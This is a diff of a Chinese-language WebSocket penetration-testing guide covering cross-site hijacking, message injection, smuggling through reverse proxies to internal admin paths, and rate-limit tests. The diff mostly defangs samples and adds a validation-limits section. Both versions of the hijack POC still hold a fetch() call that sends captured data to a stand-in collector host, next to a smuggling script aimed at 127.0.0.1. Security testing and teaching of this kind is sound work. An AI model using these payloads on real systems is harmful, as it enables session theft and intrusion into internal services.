@@ -22,18 +22,18 @@ curl -s "https://{TARGET}/static/js/main.js" | grep -oP "wss?://[^\x27\x22\s]+"
 # 在Network标签筛选WS类型请求
 
 # 手动连接测试
-websocat "wss://{TARGET}/ws" -H "Origin: https://evil.com" --no-close
+websocat "wss://{TARGET}/ws" -H "Origin: https://collector.example.invalid" --no-close
 
 # 检查握手响应中的Origin处理
 curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
-  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGVzdA==" \
-  -H "Origin: https://evil.com" \
+  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
+  -H "Origin: https://collector.example.invalid" \
   "https://{TARGET}/ws"
 ```
 **语法解析：**
 - `wss://` — WebSocket Secure协议前缀 _keyword_
 - `websocat` — WebSocket命令行客户端工具 _command_
-- `Origin: https://evil.com` — 测试跨站Origin是否被接受 _header_
+- `Origin: https://collector.example.invalid` — 测试跨站Origin是否被接受 _header_
 - `Sec-WebSocket-Key` — WebSocket握手必需的随机密钥 _header_
 
 **2. 构造跨站劫持POC页面**
@@ -57,11 +57,11 @@ curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
   
   ws.onmessage = function(evt) {
     // 窃取WebSocket返回的数据
-    document.getElementById("output").innerHTML += "<pre>" + evt.data + "</pre>";
+    document.getElementById("output").textContent += "Synthetic response received; inspect only approved canary.\n";
     // 外带到攻击者服务器
-    fetch("https://evil.com/collect", {
+    fetch("https://collector.example.invalid/collect", {
       method: "POST",
-      body: evt.data
+      body: "synthetic-canary"
     });
   };
 </script>
@@ -71,7 +71,7 @@ curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
 **语法解析：**
 - `new WebSocket("wss://{TARGET}/ws")` — 浏览器自动附加目标站点的Cookie _function_
 - `ws.onmessage` — 接收WebSocket消息——窃取实时数据 _keyword_
-- `fetch("https://evil.com/collect")` — 将窃取的数据外带到攻击者服务器 _function_
+- `fetch("https://collector.example.invalid/collect")` — 将窃取的数据外带到攻击者服务器 _function_
 
 **3. WebSocket消息注入**
 > 通过WebSocket消息注入SQL/XSS/命令注入payload
@@ -116,15 +116,14 @@ async def monitor():
         # 发送认证消息
         await ws.send(json.dumps({"type": "auth", "token": "{TOKEN}"}))
         
-        while True:
-            msg = await ws.recv()
+        for _ in range(3):
+            msg = await asyncio.wait_for(ws.recv(), timeout=5)
             data = json.loads(msg)
-            print(f"[{data.get('type', 'unknown')}] {msg}")
+            print("Synthetic message received; content withheld")
             
             # 记录敏感数据
             if 'password' in msg.lower() or 'token' in msg.lower():
-                with open('ws_sensitive.log', 'a') as f:
-                    f.write(msg + '\n')
+                print('Sensitive-field marker detected; do not persist response content')
 
 asyncio.run(monitor())
 ```
@@ -183,7 +182,7 @@ _利用反向代理/负载均衡器对WebSocket协议处理的差异，通过Web
 ```
 # 测试Upgrade响应
 curl -i -H "Connection: Upgrade" -H "Upgrade: websocket" \
-  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGVzdA==" \
+  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
   "https://{TARGET}/"
 
 # 测试H2C走私(HTTP/2 Cleartext)
@@ -208,7 +207,7 @@ import socket, ssl, base64
 
 def ws_smuggle(target_host, target_port, internal_path):
     # WebSocket握手
-    key = base64.b64encode(b"test1234test1234").decode()
+    key = base64.b64encode(__import__("os").urandom(16)).decode()
     upgrade = (
         f"GET / HTTP/1.1\r\n"
         f"Host: {target_host}\r\n"
@@ -222,19 +221,20 @@ def ws_smuggle(target_host, target_port, internal_path):
     ctx = ssl.create_default_context()
     sock = ctx.wrap_socket(socket.socket(), server_hostname=target_host)
     sock.connect((target_host, target_port))
-    sock.send(upgrade.encode())
+    sock.settimeout(5)
+    sock.sendall(upgrade.encode())
     
     resp = sock.recv(4096).decode()
     print(f"Upgrade response: {resp[:100]}")
     
-    if "101" in resp:
+    if resp.split("\r\n", 1)[0].split()[1:2] == ["101"]:
         # 走私HTTP请求到内网
         smuggled = (
             f"GET {internal_path} HTTP/1.1\r\n"
             f"Host: 127.0.0.1\r\n"
             f"\r\n"
         )
-        sock.send(smuggled.encode())
+        sock.sendall(smuggled.encode())
         print(sock.recv(4096).decode())
 
 ws_smuggle("{TARGET}", 443, "/admin/")
@@ -323,7 +323,7 @@ Sec-WebSocket-Extensions: permessage-deflate
 
 **利用方法：** 攻击路径：(1)检测目标是否经过反向代理(Server/Via头、响应特征)；(2)发送WebSocket Upgrade请求观察代理行为(是否返回101)；(3)如果代理允许升级但后端不是真正的WebSocket服务，可利用隧道发送HTTP请求；(4)在建立的隧道中发送指向127.0.0.1/内网IP的HTTP请求；(5)扫描内网端口和服务；(6)访问内部管理接口和受限API；(7)对于H2C走私使用h2cSmuggler工具自动化测试。
 
-**防御措施：** 防御措施：(1)反向代理仅在后端确认101响应时才建立隧道；(2)禁止对非WebSocket后端的Upgrade请求；(3)在代理层配置WebSocket端点白名单(仅允许特定路径升级)；(4)禁用H2C(http2_push_preload off in Nginx)；(5)后端服务也要实施访问控制，不假设所有请求都经过代理；(6)使用Network Policy/Security Group限制后端可访问的内网范围。
+**防御措施：** 防御措施：(1)反向代理仅在后端确认101响应时才建立隧道；(2)禁止对非WebSocket后端的Upgrade请求；(3)在代理层配置WebSocket端点白名单(仅允许特定路径升级)；(4)按代理版本与监听配置禁用不需要的 h2c Upgrade（http2_push_preload 不是 h2c 开关）；(5)后端服务也要实施访问控制，不假设所有请求都经过代理；(6)使用Network Policy/Security Group限制后端可访问的内网范围。
 
 ---
 
@@ -404,7 +404,7 @@ ws.send(JSON.stringify({
 }));
 
 # 遍历频道ID
-for (let i = 1; i <= 100; i++) {
+for (const i of APPROVED_SYNTHETIC_CHANNEL_IDS) {
   ws.send(JSON.stringify({
     action: "subscribe",
     channel: `user.${i}.messages`
@@ -433,16 +433,17 @@ async def rate_test():
     async with websockets.connect(uri) as ws:
         # 快速发送消息测试速率限制
         start = time.time()
-        for i in range(1000):
+        for i in range(3):
             await ws.send(json.dumps({"action": "ping", "seq": i}))
+            await asyncio.sleep(1)
         elapsed = time.time() - start
-        print(f"Sent 1000 messages in {elapsed:.2f}s")
+        print(f"Sent 3 bounded messages in {elapsed:.2f}s")
         
         # 大消息测试
-        large_msg = "A" * (1024 * 1024)  # 1MB
+        large_msg = "synthetic-canary"  # 负载/大小测试必须另行批准
         try:
             await ws.send(large_msg)
-            print("Large message accepted - no size limit!")
+            print("Client send completed; server acceptance/limit not established")
         except Exception as e:
             print(f"Large message rejected: {e}")
 
@@ -485,3 +486,11 @@ curl "https://{TARGET}/socket.io/?EIO=4&transport=polling&sid={SID}"
 **防御措施：** 防御措施：(1)在WebSocket消息级别实施持续认证(定期验证Token有效性)；(2)用户注销/权限变更时主动关闭所有WebSocket连接；(3)频道订阅实施服务端授权检查(verify channel ownership)；(4)设置WebSocket消息速率限制和大小限制；(5)使用JWT短有效期(15分钟)并在WebSocket层面实施Token刷新；(6)审计所有WebSocket事件处理器的输入验证。
 
 ---
+
+
+## 复核后的验证边界
+
+- RFC 6455 的握手 key 是 16 个随机字节的 Base64；固定示例仅作格式说明。浏览器 Cookie 是否发送受 SameSite、Secure、域/路径及浏览器策略约束，缺少 Origin 验证本身不足以证明可访问受害者会话；只使用两名受控合成用户和明确频道。
+- 不把未审查的消息写入 innerHTML、日志或外部收集器；只记录固定 canary。Python websockets 的 extra_headers 属于旧接口，现代 asyncio 接口使用 additional_headers；须按已安装版本文档选用，客户端不能证明浏览器跨站可利用。
+- 真正 WebSocket 连接升级后必须发送带掩码的客户端帧；原始 HTTP 文本不是有效 WebSocket 帧。上述原始 socket 仅描述代理/后端协议混淆假设，101 本身不是走私证据，Host:127.0.0.1 不会自动新建到该地址的 TCP 连接。h2c 还需要正确的 HTTP/2 帧；curl --next 不证明在升级隧道里发送了后续 HTTP。
+- 客户端 send 返回不代表服务器处理，更不能证明不存在大小/速率限制。延长会话的行为需对照应用既定失效策略；持有另一受控用户自己的 token 成功登录不等于会话固定。子协议、大小写、压缩、明文降级均不自动绕过认证。所有示例仅静态审查，未建立连接或执行负载测试。
